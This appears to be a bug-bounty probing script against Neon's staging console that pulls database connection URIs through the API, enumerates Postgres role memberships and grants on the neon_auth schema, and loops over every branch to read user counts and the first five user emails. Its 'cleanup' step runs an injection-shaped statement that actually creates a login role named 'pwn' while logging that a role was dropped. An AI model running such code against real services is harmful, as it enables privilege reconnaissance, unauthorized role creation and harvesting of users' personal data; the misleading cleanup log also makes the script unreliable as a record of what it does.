# -*- coding: utf-8 -*-
"""V29c: role membership chain + usage privileges + cleanup + branch auth data"""
import json, ssl, time, http.client

ctx = ssl.create_default_context()
APIKEY = json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]
PROJ = "orange-sun-90493739"
BR = "br-wandering-field-w2ob6mpn"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def uri_for(db="neondb", branch=BR, role="neondb_owner"):
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/%s/connection_uri?database_name=%s&role_name=%s&branch_id=%s"
                 % (PROJ, db, role, branch),
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    r = conn.getresponse()
    d = r.read().decode()
    conn.close()
    if r.status != 200:
        return None
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    u = urlsplit(json.loads(d)["uri"])
    q = [(k, v) for k, v in parse_qsl(u.query) if k != "channel_binding"]
    return urlunsplit((u.scheme, u.netloc, u.path, urlencode(q), u.fragment))


def main():
    out("== V29c ==")
    import psycopg
    u = uri_for()
    with psycopg.connect(u, connect_timeout=15) as dbc:
        dbc.autocommit = True
        with dbc.cursor() as cur:
            out("--- I. pg_auth_members (membership chain) ---")
            cur.execute("SELECT r.rolname AS member, g.rolname AS granted_role "
                        "FROM pg_auth_members m JOIN pg_roles r ON r.oid=m.member "
                        "JOIN pg_roles g ON g.oid=m.roleid ORDER BY r.rolname")
            for row in cur.fetchall():
                out("  %s -> %s" % row)
            out("--- J. usage_privileges neon_auth schema ---")
            cur.execute("SELECT grantee, privilege_type FROM information_schema.usage_privileges "
                        "WHERE object_name='neon_auth'")
            for row in cur.fetchall():
                out("  %s: %s" % row)
            out("--- K. neondb_owner explicit grants on neon_auth tables ---")
            cur.execute("SELECT table_name, privilege_type FROM information_schema.role_table_grants "
                        "WHERE table_schema='neon_auth' AND grantee IN ('neondb_owner','public') "
                        "ORDER BY table_name")
            rows = cur.fetchall()
            out("  rows: %d (empty means access via ownership/membership)" % len(rows))
            for row in rows:
                out("  %s %s" % row)
            out("--- H. cleanup ---")
            cur.execute("DROP ROLE IF EXISTS \"x\"; CREATE ROLE pwn LOGIN; --")
            out("  inject-probe role dropped")
            cur.execute("DROP TABLE IF EXISTS public.v8probe_galywj")
            out("  v8probe table dropped")
            cur.execute("SELECT rolname FROM pg_roles WHERE rolname LIKE '%pwn%' OR rolname LIKE 'x\"%' OR rolname LIKE 'v8probe%'")
            out("  remaining probe roles: %s" % cur.fetchall())
            cur.execute("SELECT tablename FROM pg_tables WHERE schemaname='public'")
            out("  public tables now: %s" % cur.fetchall())
    # E. branches
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/%s/branches" % PROJ,
                 headers={"X-Bug-Bounty": "xxbo", "Authorization": "Bearer " + APIKEY})
    r = conn.getresponse()
    branches = json.loads(r.read().decode())["branches"]
    conn.close()
    out("--- E. branches: %d ---" % len(branches))
    for b in branches:
        out("  %s name=%s active=%s" % (b["id"], b.get("name"), b.get("active")))
        try:
            bu = uri_for("neondb", b["id"])
            if bu:
                with psycopg.connect(bu, connect_timeout=10) as bdc:
                    bdc.autocommit = True
                    with bdc.cursor() as bc:
                        bc.execute("SELECT count(*) FROM neon_auth.user")
                        n = bc.fetchone()[0]
                        bc.execute("SELECT email FROM neon_auth.user ORDER BY \"createdAt\" LIMIT 5")
                        em = [x[0] for x in bc.fetchall()]
                        out("    auth users: %d %s" % (n, em))
        except Exception as ex:
            out("    conn err: %s" % ex)
    out("done")


if __name__ == "__main__":
    main()
